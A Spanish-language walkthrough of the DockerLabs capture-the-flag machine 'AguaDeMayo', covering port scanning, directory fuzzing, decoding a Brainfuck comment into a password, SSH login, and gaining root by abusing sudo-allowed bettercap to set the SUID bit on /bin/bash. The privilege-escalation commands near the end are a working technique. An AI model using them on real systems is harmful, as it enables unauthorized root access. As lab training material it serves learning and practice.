Lo primero que tenemos que hacer, es ir a la pagina de "dockerlabs.es" y bajarnos la maquina "AguaDeMayo".
Una vez hecho y COMO SIEMPRE, descomprimimos el archivo, e inicializamos la maquina con el comando:
```
sudo bash auto_deploy.sh aguademayo.tar
```
Lo primero de todo, tras desplegarse la maquina, es hacer un NMAP. No necesitamos hacer un ARP-SCAN (o NETDISCOVER), porque ya sabemos la IP de la maquina victima.
```
nmap -p- --open -sCV -sS --min-rate 5000 172.17.0.2 -n -Pn -vvv
```
Una vez terminado, vemos que tiene dos puertos abiertos: el 22 (SSH) y el 80 (HTTP)
```
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
```
Como no tenemos ni usuario ni contraseña aun para atacar el puerto 22, vamos a probar poniendo la direccion IP en el navegador.

Sin embargo, aparece la tipica pagina de Apache, por lo que vamos a pulsar "CTRL + U" para ver si hay algo interesante en el codigo fuente y, tras bajar y bajar, vemos un "texto" comentado:
```
<!--
++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
-->
```
Despues de buscar por internet, parece ser que es un tipo de codigo que pertenece a "Brainfuck", por lo que vamos a buscar algun "decodificador" en Google.

En mi caso, esta pagina: "https://www.dcode.fr/brainfuck-language" donde introducimos el texto anterior para ver que obtenemos y el resultado es este:
```
bebeaguaqueessano
```
Vale, ya tenemos algo que no sabemos si es un usuario o una contraseña, por lo que vamos a hacer algo de  FUZZING WEB con "gobuster" para ver si conseguimos algo mas de informacion:
```
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x txt,php,asp,aspx,jsp,html -t 20
```
Vemos que encuentra un directorio llamado "/images". El resto no parece que sean relevantes:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 309] [--> http://172.17.0.2/images/]
/index.html           (Status: 200) [Size: 11142]
/.html                (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
```
Accedo entonces, desde el navegador y vemos que hay un archivo que se llama: "agua_ssh.jpg" por lo que procederemos a descargarlo con "wget", por ejemplo:
```
wget http://172.17.0.2/images/agua_ssh.jpg

--2024-08-04 01:43:44--  http://172.17.0.2/images/agua_ssh.jpg
Conectando con 172.17.0.2:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 50517 (49K) [image/jpeg]
Grabando a: «agua_ssh.jpg»

agua_ssh.jpg                 100%[===============================================>]  49,33K  --.-KB/s    en 0s    

2024-08-04 01:43:44 (2,11 GB/s) - «agua_ssh.jpg» guardado [50517/50517]
```
Una vez descargada, la abrimos y vemos que solo es una imagen sin relevancia, por lo que probaremos primero con la herramienta "exiftool" a ver si hay algo en los metadatos:
```
exiftool agua_ssh.jpg


ExifTool Version Number         : 12.76
File Name                       : agua_ssh.jpg
Directory                       : .
File Size                       : 51 kB
File Modification Date/Time     : 2024:05:14 19:43:34+02:00
File Access Date/Time           : 2024:08:04 01:45:31+02:00
File Inode Change Date/Time     : 2024:08:04 01:43:44+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 640
Image Height                    : 427
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 640x427
Megapixels                      : 0.273
```
Pero no parece que haya nada. Es momento de probar si hay algo oculto mediante esteganografia con "steghide":
```
steghide extract -sf agua_ssh.jpg

Anotar salvoconducto: 
steghide: ¡no pude extraer ningún dato con ese salvoconducto!
```
Pero tampoco encontramos nada, tal y como acabamos de ver. Asi que vamos a tirar un poco de fuerza bruta con HYDRA y vamos a ver si usando la palabra "bebeaguaqueessano" podemos conseguir bien un usuario o bien una contraseña.

Tras perder MUCHO tiempo y no obtener nada, he tenido que mirar una guia y resulta que el usuario era "agua". WTF ^_^U!!

En fin, volviendo a la maquina y ya teniendo el usuario y la contraseña, accedemos via SSH:
```
ssh agua@172.17.0.2
```
Tras poner "yes" e introducir despues la contraseña, ya estariamos dentro, por lo que empezariamos probando escaladas de privilegios tipicas, empezando por "sudo -l":
```
agua@224d3419cff1:~$ sudo -l
Matching Defaults entries for agua on 224d3419cff1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User agua may run the following commands on 224d3419cff1:
    (root) NOPASSWD: /usr/bin/bettercap
    
agua@224d3419cff1:~$ 
```
Si ejecutamos el binario, obtenemos una especie de "shell":
```
sudo -u root /usr/bin/bettercap

bettercap v2.32.0 (built for linux amd64 with go1.19.8) [type 'help' for a list of commands]

172.17.0.0/16 > 172.17.0.2  » [00:20:52] [sys.log] [war] exec: "ip": executable file not found in $PATH
172.17.0.0/16 > 172.17.0.2  »
```
Como no se usarlo, ejecuto el comando "help" tal y como nos dicen arriba, para obtener informacion y comandos a ejecutar:
```
172.17.0.0/16 > 172.17.0.2  » help

help MODULE : List available commands or show module specific help if no module name is provided.

active : Show information about active modules.

quit : Close the session and exit.

sleep SECONDS : Sleep for the given amount of seconds.

get NAME : Get the value of variable NAME, use * alone for all, or NAME* as a wildcard.

set NAME VALUE : Set the VALUE of variable NAME.

read VARIABLE PROMPT : Show a PROMPT to ask the user for input that will be saved inside VARIABLE.

clear : Clear the screen.

include CAPLET : Load and run this caplet in the current session.

! COMMAND : Execute a shell command and print its output. <=== INTERESANTE !!

alias MAC NAME : Assign an alias to a given endpoint given its MAC address.
```
Si nos fijamos hay un comando que es "!" que nos permite ejecutar una "shell command", por lo que vamos a utilizar esta opcion:
```
172.17.0.0/16 > 172.17.0.2  » ! chmod u+s /bin/bash
```
Una vez ejecutado, salimos y ejecutamos el comando "bash -p", lo cual, tal y como se puede ver abajo, nos da un prompt con el usuario "root":
```
172.17.0.0/16 > 172.17.0.2  » exit

open /proc/sys/net/ipv4/ip_forward: read-only file systemagua@224d3419cff1:~$ bash -p

bash-5.2# whoami
root

bash-5.2# 
```
Y listo, la maquina estaria ya hecha.
